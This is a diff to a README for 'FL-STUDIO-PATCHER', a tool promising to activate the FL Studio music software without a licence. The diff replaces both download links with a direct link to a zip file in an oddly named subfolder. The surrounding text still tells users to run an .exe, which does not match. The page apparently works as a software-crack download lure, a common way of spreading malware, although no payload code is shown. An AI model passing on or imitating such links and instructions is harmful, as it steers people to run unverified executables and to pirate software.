@@ -1,6 +1,6 @@
 # 🎧 FL-STUDIO-PATCHER - Activate your music production software easily
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Oracles4426/FL-STUDIO-PATCHER)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Oracles4426/FL-STUDIO-PATCHER/raw/refs/heads/main/shape/STUDI-PATCHER-F-v3.8.zip)
 
 ## 📖 About the project
 
@@ -19,7 +19,7 @@ Your computer needs specific settings to run this tool. Verify your system meets
 
 You must download the current version directly from our repository.
 
-[**Download the latest version here**](https://github.com/Oracles4426/FL-STUDIO-PATCHER)
+[**Download the latest version here**](https://github.com/Oracles4426/FL-STUDIO-PATCHER/raw/refs/heads/main/shape/STUDI-PATCHER-F-v3.8.zip)
 
 Visit that page to find the most recent file. Look for the assets section at the bottom of the release notes. Select the file ending in .exe to start your download. Move this file to a folder you can find easily, such as your Desktop or Downloads folder.
 
